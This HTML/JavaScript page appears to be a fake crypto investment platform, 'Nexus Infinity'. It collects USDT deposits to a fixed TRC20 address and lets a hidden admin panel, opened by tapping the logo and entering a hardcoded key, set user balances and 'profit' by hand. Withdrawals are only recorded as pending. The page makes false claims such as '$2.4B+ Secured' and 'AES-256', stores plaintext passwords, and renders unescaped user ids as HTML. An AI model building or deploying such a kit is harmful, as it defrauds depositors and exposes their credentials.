<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NEXUS INFINITY | Global Institutional Terminal</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;800&display=swap');
        :root { --gold: #f3ba2f; --slate: #0f172a; }
        body { background: #ffffff; font-family: 'Plus Jakarta Sans', sans-serif; overflow-x: hidden; margin: 0; }

        /* SPLASH SCREEN */
        #splash {
            position: fixed; inset: 0; background: #000; z-index: 9999;
            display: flex; flex-direction: column; align-items: center; justify-content: center;
            transition: 1s ease-in-out;
        }
        .splash-logo { animation: pulse 2s infinite; background: white; color: black; width: 80px; height: 80px; border-radius: 24px; display: flex; align-items: center; justify-content: center; font-size: 40px; font-weight: 900; }
        @keyframes pulse { 0%, 100% { transform: scale(1); opacity: 0.8; } 50% { transform: scale(1.1); opacity: 1; } }

        /* UI COMPONENTS */
        .glass-card { background: white; border: 1px solid rgba(0,0,0,0.05); border-radius: 35px; box-shadow: 0 15px 50px rgba(0,0,0,0.02); transition: 0.4s; }
        .input-pro { background: #f8fafc; border: 2px solid transparent; border-radius: 22px; padding: 18px; width: 100%; font-weight: 700; transition: 0.3s; outline: none; text-align: center; }
        .input-pro:focus { border-color: var(--gold); background: #fff; box-shadow: 0 10px 30px rgba(243,186,47,0.1); }
        .btn-gold { background: linear-gradient(135deg, #f3ba2f 0%, #ffdb4d 100%); color: #000; font-weight: 900; padding: 18px; border-radius: 22px; width: 100%; text-transform: uppercase; letter-spacing: 1.5px; box-shadow: 0 10px 30px rgba(243,186,47,0.2); border: none; cursor: pointer; transition: 0.3s; }
        .btn-gold:active { transform: scale(0.95); }

        /* UTILS */
        .hidden { display: none !important; }
        .status-pill { padding: 4px 12px; border-radius: 100px; font-size: 9px; font-weight: 800; text-transform: uppercase; }
        .pending { background: #fff7ed; color: #f97316; }
        .approved { background: #f0fdf4; color: #22c55e; }
    </style>
</head>
<body>

    <div id="splash">
        <div class="splash-logo">N</div>
        <h2 class="text-white mt-6 font-black italic text-2xl tracking-tighter uppercase">Nexus<span class="text-[#f3ba2f]">Infinity</span></h2>
        <p class="text-slate-500 text-[9px] font-bold tracking-[0.4em] mt-2 uppercase">Institutional Grade Security</p>
    </div>

    <div id="auth-section" class="min-h-screen flex items-center justify-center p-8 hidden">
        <div class="w-full max-w-sm space-y-10">
            <div class="text-center">
                <div class="w-16 h-16 bg-black text-white rounded-3xl mx-auto flex items-center justify-center text-3xl font-black mb-4">N</div>
                <h1 class="text-3xl font-black italic uppercase tracking-tighter">Nexus<span class="text-[#f3ba2f]">Infinity</span></h1>
            </div>

            <div id="login-ui" class="space-y-4">
                <input type="text" id="l-user" placeholder="Terminal Username" class="input-pro">
                <input type="password" id="l-pass" placeholder="Security Password" class="input-pro">
                <button onclick="handleLogin()" class="btn-gold">Connect to Mainframe</button>
                <p class="text-center text-[10px] font-black text-slate-400 uppercase">New Node? <span onclick="toggleAuth(true)" class="text-black underline cursor-pointer">Initialize ID</span></p>
            </div>

            <div id="signup-ui" class="space-y-4 hidden">
                <input type="text" id="s-user" placeholder="Choose Username" class="input-pro">
                <input type="email" id="s-email" placeholder="Institutional Email" class="input-pro">
                <input type="password" id="s-pass" placeholder="Create Password" class="input-pro">
                <button onclick="handleSignup()" class="btn-gold">Create Identity</button>
                <p class="text-center text-[10px] font-black text-slate-400 uppercase">Registered? <span onclick="toggleAuth(false)" class="text-black underline cursor-pointer">Login</span></p>
            </div>

            <div class="pt-10 grid grid-cols-2 gap-4 border-t border-slate-50 opacity-40">
                <div class="text-center"><p class="text-xs font-black italic">$2.4B+</p><p class="text-[7px] font-bold uppercase tracking-widest">Secured</p></div>
                <div class="text-center"><p class="text-xs font-black italic">99.9%</p><p class="text-[7px] font-bold uppercase tracking-widest">Uptime</p></div>
            </div>
        </div>
    </div>

    <div id="main-app" class="hidden">
        <nav class="sticky top-0 bg-white/80 backdrop-blur-xl border-b border-slate-50 px-6 py-5 flex justify-between items-center z-[500]">
            <div id="logo-trigger" class="flex items-center gap-3 cursor-pointer">
                <div class="w-8 h-8 bg-black text-white rounded-lg flex items-center justify-center font-black text-xs">N</div>
                <h2 class="font-black italic uppercase tracking-tighter text-lg">Nexus<span class="text-[#f3ba2f]">Infinity</span></h2>
            </div>
            <button onclick="logout()" class="w-10 h-10 bg-slate-50 rounded-full flex items-center justify-center text-slate-300 hover:text-red-500 transition"><i class="fa-solid fa-power-off"></i></button>
        </nav>

        <main class="container mx-auto px-6 py-8 space-y-8">
            <div class="glass-card p-10 bg-gradient-to-br from-white to-[#fcfdff] relative overflow-hidden">
                <p class="text-[9px] font-black text-slate-400 uppercase tracking-widest mb-2">Available Asset Balance</p>
                <h2 id="balance-txt" class="text-6xl font-black italic tracking-tighter text-slate-900 mb-8">$0.00</h2>
                <div class="flex gap-3">
                    <button onclick="openModal('dep')" class="px-8 py-4 bg-[#f3ba2f] text-black font-black rounded-xl text-[9px] uppercase tracking-widest">Deposit</button>
                    <button onclick="openModal('wit')" class="px-8 py-4 bg-slate-100 text-slate-400 font-black rounded-xl text-[9px] uppercase tracking-widest">Withdraw</button>
                </div>
            </div>

            <div class="grid grid-cols-2 md:grid-cols-4 gap-4">
                <div class="glass-card p-6 text-center"><p class="text-[8px] font-black text-slate-300 uppercase mb-1">Profit</p><p id="profit-txt" class="text-sm font-black text-green-500">+$0.00</p></div>
                <div class="glass-card p-6 text-center"><p class="text-[8px] font-black text-slate-300 uppercase mb-1">Status</p><p class="text-sm font-black text-blue-500 italic">VIP Elite</p></div>
                <div class="glass-card p-6 text-center"><p class="text-[8px] font-black text-slate-300 uppercase mb-1">Nodes</p><p class="text-sm font-black">Online</p></div>
                <div class="glass-card p-6 text-center"><p class="text-[8px] font-black text-slate-300 uppercase mb-1">Security</p><p class="text-sm font-black">AES-256</p></div>
            </div>

            <div class="glass-card p-8">
                <h3 class="text-[10px] font-black uppercase mb-6 tracking-widest text-slate-300">Institutional Ledger</h3>
                <div id="history-list" class="space-y-4">
                    <p class="text-center py-10 text-[10px] font-bold text-slate-300 uppercase italic tracking-widest">No Recent Logs</p>
                </div>
            </div>
        </main>
    </div>

    <div id="modal-overlay" class="fixed inset-0 bg-white/95 backdrop-blur-xl z-[1000] flex items-center justify-center p-6 hidden">
        <div class="w-full max-w-md glass-card p-10 relative">
            <button onclick="closeModal()" class="absolute top-6 right-8 text-3xl font-thin">&times;</button>
            <div id="dep-content" class="hidden">
                <h3 class="text-2xl font-black italic uppercase mb-8">Deposit Assets</h3>
                <div class="p-5 bg-slate-50 rounded-2xl mb-6 text-center"><p class="text-[8px] font-black text-slate-400 uppercase mb-2">TRC20 USDT Address</p><p class="text-[10px] font-mono font-black break-all">TAvfQQ18hXHdVCHbExV4yUPvQ4XkNgfKsJ</p></div>
                <input type="number" id="tx-amt" placeholder="Amount (USD)" class="input-pro mb-4">
                <button onclick="submitTX('DEPOSIT')" class="btn-gold">Confirm Transfer</button>
            </div>
            <div id="wit-content" class="hidden">
                <h3 class="text-2xl font-black italic uppercase mb-8 text-red-500">Withdraw Assets</h3>
                <input type="text" id="wit-addr" placeholder="Destination Address" class="input-pro mb-4">
                <input type="number" id="wit-amt" placeholder="0.00" class="input-pro mb-8">
                <button onclick="submitTX('WITHDRAW')" class="btn-gold !bg-black !text-white">Request Payout</button>
            </div>
        </div>
    </div>

    <div id="admin-panel" class="fixed inset-0 bg-white z-[2000] p-10 hidden overflow-y-auto">
        <div class="flex justify-between items-center mb-10">
            <h2 class="text-2xl font-black italic">Nexus Admin Terminal</h2>
            <button onclick="location.reload()" class="text-3xl">&times;</button>
        </div>
        <div id="admin-user-list" class="space-y-4"></div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getDatabase, ref, set, get, update, onValue } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";

        const firebaseConfig = {
            apiKey: "AIzaSyBEqvT7AYCTZg1Bb6zEDtJn71QrYopX73M",
            authDomain: "coin-07.firebaseapp.com",
            databaseURL: "https://coin-07-default-rtdb.firebaseio.com",
            projectId: "coin-07",
            storageBucket: "coin-07.firebasestorage.app",
            appId: "1:341970060013:web:67374c0fd262b63bd342e4"
        };
        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);
        let currentUser = localStorage.getItem('nexus_session');

        // Initial Boot
        window.onload = () => {
            setTimeout(() => {
                document.getElementById('splash').style.opacity = '0';
                setTimeout(() => {
                    document.getElementById('splash').classList.add('hidden');
                    if(currentUser) loadDashboard(currentUser);
                    else document.getElementById('auth-section').classList.remove('hidden');
                }, 1000);
            }, 2500);
        };

        // Auth Logic
        window.toggleAuth = (s) => {
            document.getElementById('login-ui').classList.toggle('hidden', s);
            document.getElementById('signup-ui').classList.toggle('hidden', !s);
        };

        window.handleSignup = async () => {
            const u = document.getElementById('s-user').value.trim();
            const e = document.getElementById('s-email').value.trim();
            const p = document.getElementById('s-pass').value.trim();
            if(!u || !p) return alert("Fill all fields, sweetie!");
            const snap = await get(ref(db, `users/${u}`));
            if(snap.exists()) return alert("Username taken!");
            await set(ref(db, `users/${u}`), { username: u, email: e, password: p, balance: 0, profit: 0, history: [] });
            alert("Node Activated! Please Login.");
            toggleAuth(false);
        };

        window.handleLogin = async () => {
            const u = document.getElementById('l-user').value.trim();
            const p = document.getElementById('l-pass').value.trim();
            const snap = await get(ref(db, `users/${u}`));
            if(snap.exists() && snap.val().password === p) {
                localStorage.setItem('nexus_session', u);
                location.reload();
            } else alert("Invalid Security Key!");
        };

        // Dashboard Logic
        function loadDashboard(uid) {
            document.getElementById('auth-section').classList.add('hidden');
            document.getElementById('main-app').classList.remove('hidden');
            onValue(ref(db, `users/${uid}`), (snap) => {
                const data = snap.val();
                if(data) {
                    document.getElementById('balance-txt').innerText = '$' + (data.balance || 0).toLocaleString();
                    document.getElementById('profit-txt').innerText = '+$' + (data.profit || 0).toLocaleString();
                    const hList = document.getElementById('history-list');
                    if(data.history) {
                        hList.innerHTML = data.history.map(tx => `
                            <div class="flex justify-between items-center p-5 bg-slate-50 rounded-2xl">
                                <div><p class="text-[8px] font-black text-slate-400 uppercase">${tx.date}</p><p class="text-[10px] font-black uppercase">${tx.type}</p></div>
                                <div class="text-right"><p class="text-[11px] font-black">$${tx.amt}</p><span class="status-pill ${tx.status.toLowerCase()}">${tx.status}</span></div>
                            </div>
                        `).join('');
                    }
                }
            });
        }

        // Transactions
        window.openModal = (type) => {
            document.getElementById('modal-overlay').classList.remove('hidden');
            document.getElementById('dep-content').classList.toggle('hidden', type !== 'dep');
            document.getElementById('wit-content').classList.toggle('hidden', type !== 'wit');
        };
        window.closeModal = () => document.getElementById('modal-overlay').classList.add('hidden');

        window.submitTX = async (type) => {
            const amt = type === 'DEPOSIT' ? document.getElementById('tx-amt').value : document.getElementById('wit-amt').value;
            if(!amt || amt <= 0) return alert("Enter valid amount!");
            const snap = await get(ref(db, `users/${currentUser}`));
            let h = snap.val().history || [];
            h.unshift({ type, amt, date: new Date().toLocaleString(), status: 'PENDING' });
            await update(ref(db, `users/${currentUser}`), { history: h });
            alert("Transaction Broadcasted!");
            closeModal();
        };

        window.logout = () => { localStorage.clear(); location.reload(); };

        // Admin Secret
        let taps = 0;
        document.getElementById('logo-trigger').onclick = () => {
            taps++;
            if(taps === 4) {
                if(prompt("Admin Key:") === "coin786") showAdmin();
                taps = 0;
            }
            setTimeout(() => taps = 0, 3000);
        };

        function showAdmin() {
            document.getElementById('admin-panel').classList.remove('hidden');
            onValue(ref(db, 'users'), (snap) => {
                const data = snap.val();
                let html = "";
                for(let id in data) {
                    html += `<div class="glass-card p-6 flex justify-between items-center">
                        <div><p class="text-xs font-black uppercase">${id}</p><p class="text-[10px] text-slate-400">$${data[id].balance}</p></div>
                        <div class="flex gap-2">
                            <button onclick="modVal('${id}', 'balance')" class="bg-black text-white px-3 py-1 rounded text-[9px]">BAL</button>
                            <button onclick="modVal('${id}', 'profit')" class="bg-green-500 text-white px-3 py-1 rounded text-[9px]">PRF</button>
                            <button onclick="approveTX('${id}')" class="bg-blue-500 text-white px-3 py-1 rounded text-[9px]">APP</button>
                        </div>
                    </div>`;
                }
                document.getElementById('admin-user-list').innerHTML = html;
            });
        }
        window.modVal = (id, f) => { const v = prompt(`New ${f}:`); if(v) update(ref(db, `users/${id}`), {[f]: parseFloat(v)}); };
        window.approveTX = async (id) => {
            const snap = await get(ref(db, `users/${id}`));
            const h = snap.val().history;
            if(h && h[0]) { h[0].status = "APPROVED"; update(ref(db, `users/${id}`), {history: h}); alert("Done!"); }
        };
    </script>
</body>
</html>
